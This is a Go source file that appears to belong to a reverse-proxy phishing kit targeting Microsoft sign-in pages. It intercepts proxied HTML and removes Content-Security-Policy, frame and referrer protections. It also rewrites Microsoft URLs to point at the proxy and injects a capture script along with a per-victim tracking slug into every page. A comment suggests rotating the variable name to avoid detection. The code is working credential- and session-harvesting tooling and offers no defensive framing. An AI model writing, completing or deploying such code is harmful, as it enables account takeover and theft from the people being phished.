package inject

import (
	"bytes"
	"compress/gzip"
	"fmt"
	"io"
	"net/http"
	"strconv"
	"strings"
)

var slugVarName = "__x" // short, meaningless – consider rotating

func InjectJavaScript(html string, r *http.Request) string {
	var headInject strings.Builder

	if slug, ok := r.Context().Value("slug").(string); ok && slug != "" {
		headInject.WriteString(fmt.Sprintf(`<script>window.%s = "%s";</script>`+"\n", slugVarName, slug))
	} else if slug := extractSlugFromPath(r.URL.Path); slug != "" {
		headInject.WriteString(fmt.Sprintf(`<script>window.%s = "%s";</script>`+"\n", slugVarName, slug))
	}

	headInject.WriteString("<script>" + CombinedCaptureScript + "</script>\n")
	injectBlock := headInject.String()

	switch {
	case strings.Contains(html, "</head>"):
		return strings.Replace(html, "</head>", injectBlock+"</head>", 1)
	case strings.Contains(html, "</body>"):
		return strings.Replace(html, "</body>", injectBlock+"</body>", 1)
	case strings.Contains(html, "</html>"):
		return strings.Replace(html, "</html>", injectBlock+"</html>", 1)
	default:
		return "<html><head>" + injectBlock + "</head><body>" + html + "</body></html>"
	}
}

func StripCSP(h http.Header) {
	for _, k := range []string{
		"Content-Security-Policy", "Content-Security-Policy-Report-Only",
		"X-Content-Security-Policy", "X-WebKit-CSP",
		"X-Frame-Options", "Referrer-Policy",
	} {
		h.Del(k)
	}
}

func IsHTML(h http.Header) bool {
	ct := h.Get("Content-Type")
	return strings.Contains(ct, "text/html") || strings.Contains(ct, "application/xhtml+xml")
}

func ReplaceBody(resp *http.Response, b []byte) {
	resp.Body = io.NopCloser(bytes.NewReader(b))
	resp.ContentLength = int64(len(b))
	resp.Header.Set("Content-Length", strconv.Itoa(len(b)))
	resp.Header.Set("Content-Type", "text/html; charset=utf-8")
	resp.Header.Del("Content-Encoding")
}

func ProcessHTMLResponse(resp *http.Response, r *http.Request) {
	if !IsHTML(resp.Header) {
		return
	}

	var reader io.ReadCloser
	var err error

	switch resp.Header.Get("Content-Encoding") {
	case "gzip":
		reader, err = gzip.NewReader(resp.Body)
		if err != nil {
			return
		}
		defer reader.Close()
	default:
		reader = resp.Body
	}
	defer resp.Body.Close()

	raw, err := io.ReadAll(reader)
	if err != nil {
		return
	}

	html := string(raw)
	if !strings.HasPrefix(strings.ToLower(strings.TrimSpace(html)), "<!doctype") {
		html = "<!DOCTYPE html>\n" + html
	}

	StripCSP(resp.Header)
	html = RewriteMicrosoftURLs(html, r.Host)
	html = InjectJavaScript(html, r)
	ReplaceBody(resp, []byte(html))
}

func extractSlugFromPath(path string) string {
	parts := strings.Split(strings.Trim(path, "/"), "/")
	if len(parts) > 0 && len(parts[0]) >= 4 && len(parts[0]) <= 16 {
		return parts[0]
	}
	return ""
}
